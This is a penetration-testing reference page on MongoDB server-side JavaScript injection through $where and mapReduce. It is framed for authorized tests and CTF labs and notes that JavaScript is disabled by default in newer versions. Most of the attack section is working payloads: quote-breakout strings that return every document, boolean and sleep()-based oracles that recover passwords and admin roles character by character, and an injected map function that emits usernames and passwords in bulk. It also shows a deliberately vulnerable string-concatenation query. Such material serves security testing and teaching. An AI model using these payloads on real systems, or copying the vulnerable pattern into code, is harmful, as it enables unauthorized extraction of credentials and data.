---
title: "MongoDB $where and mapReduce server-side JavaScript injection"
description: "$where and mapReduce evaluate server-side JavaScript; where enabled, injected JS strings break out of expressions, force always-true conditions, and time out blindly."
keywords:
  - $where
  - mapReduce
  - server-side JavaScript
  - MongoDB injection
  - JavaScript breakout
  - blind time-based
---

# Where JavaScript

`$where` and `mapReduce` evaluate JavaScript **server-side** against each document, which makes any user input that reaches their code string a JavaScript injection sink rather than merely an operator sink.

> **Scope.** For authorized penetration tests, CTF labs, and code review of systems you own or are contracted to assess.

## Availability precondition

This technique is far narrower than operator injection. Modern MongoDB (4.4 and later) ships with server-side JavaScript **disabled by default**: the `security.javascriptEnabled` server setting must be on for `$where`, `mapReduce`, and `$function` to run, and many deployments leave it off. `$where` also cannot use query operators and must be a JavaScript expression or function, so it is reachable only where the application builds a `$where` string from input. Treat everything below as conditional on JavaScript being enabled on the target; where it is off, these payloads error instead of executing, and the operator techniques elsewhere in this subtree are the path.

## The sink

```javascript
// user input concatenated into a $where string
db.collection("users").find({
  $where: "this.username == '" + req.body.username + "'"
});
```

The input lands inside a JavaScript string compared per document, so a quote closes the string and the rest is parsed as JavaScript.

## JavaScript-string breakout

Close the literal and force the whole expression true, exactly as in SQL string breakout but in JavaScript syntax:

```
' || '1'=='1
' || true || '
a'; return true; var x='
```

The first makes the per-document predicate `this.username == '' || '1'=='1'`, true for every document, returning the entire collection. A function-valued `$where` is replaced wholesale when the input controls it:

```javascript
{ "$where": "function(){ return true; }" }
```

Because `$where` runs real JavaScript, the expression can read other fields of the current document to exfiltrate through a boolean oracle:

```
' || this.password[0]=='a' || '
' || this.role=='admin' || '
```

Each request tests one condition about another field, and the match/no-match signal recovers the value character by character, the same oracle loop used with `$regex` but expressed in JavaScript.

## Blind time-based via sleep()

Where no result difference is observable but JavaScript is enabled, delay execution and measure response time. A `sleep()` call inside the injected expression makes the server pause once the condition holds:

```
' || (this.username=='admin' && sleep(5000)) || '
```

```javascript
{ "$where": "function(){ if (this.role=='admin') { sleep(5000); } return false; }" }
```

A slow response means the condition was true. Bound the loop by anchoring on one field at a time (`this.secret[0]=='a'`, then `[1]`, and so on), inferring each character from whether the request hangs. Because `$where` executes against every document in the scan, keep the matched set small (pin a username first) so the delay is attributable and the scan stays cheap.

## mapReduce

`mapReduce` runs JavaScript `map` and `reduce` functions server-side and is subject to the same `javascriptEnabled` gate. Where input reaches those function bodies, the same breakout and inference apply, with the emitted keys/values as the output channel:

```javascript
db.collection.mapReduce(
  "function(){ emit(this.username, this.password); }",  // injected map body
  "function(k,v){ return v; }",
  { out: { inline: 1 } }
);
```

An injected `map` that emits sensitive fields turns the reduce output into a bulk extraction channel when the result is reflected.

## References

- [MongoDB: $where](https://www.mongodb.com/docs/manual/reference/operator/query/where/)
- [MongoDB: Server-side JavaScript](https://www.mongodb.com/docs/manual/core/server-side-javascript/)
- [MongoDB: mapReduce](https://www.mongodb.com/docs/manual/reference/command/mapReduce/)
- [PayloadsAllTheThings: NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
